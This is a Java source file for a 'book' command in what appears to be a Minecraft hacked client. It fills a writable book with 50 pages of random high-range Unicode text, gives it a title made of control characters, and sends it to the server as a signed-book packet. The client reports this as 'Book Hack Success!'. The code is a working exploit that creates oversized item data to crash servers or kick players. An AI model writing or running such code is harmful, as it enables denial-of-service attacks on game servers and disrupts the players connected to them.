package we.devs.forever.client.command.impl.commands;

import io.netty.buffer.Unpooled;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;
import we.devs.forever.api.util.Util;
import we.devs.forever.client.command.api.Command;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public
class BookCommand extends Command {

    public BookCommand() {
        super("book");
    }

    @Override
    public void execute(String[] commands) {
        ItemStack heldItem = Util.mc.player.getHeldItemMainhand();
        if (heldItem.getItem() == Items.WRITABLE_BOOK) {
            final int limit = 50;
            Random rand = new Random();
            IntStream characterGenerator = rand.ints(128, 1112063).map(i -> (i < 55296) ? i : (i + 2048));
            String joinedPages = characterGenerator.limit(50 * 210).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
            NBTTagList pages = new NBTTagList();
            for (int page = 0; page < limit; ++page) {
                pages.appendTag(new NBTTagString(joinedPages.substring(page * 210, (page + 1) * 210)));
            }
            if (heldItem.hasTagCompound()) {
                heldItem.getTagCompound().setTag("pages", pages);
            } else {
                heldItem.setTagInfo("pages", pages);
            }
            StringBuilder stackName = new StringBuilder();
            for (int i = 0; i < 16; i++)
                stackName.append("\u0014\f");

            heldItem.setTagInfo("author", new NBTTagString(Util.mc.player.getName()));
            heldItem.setTagInfo(
                    "title",
                    new NBTTagString(stackName.toString()));

            PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
            buf.writeItemStack(heldItem);
            Util.mc.player.connection.sendPacket(new CPacketCustomPayload("MC|BSign", buf));
            sendMessage(commandManager.getPrefix() + "Book Hack Success!");
        } else {
            sendMessage(commandManager.getPrefix() + "b1g 3rr0r!");
        }
    }
}
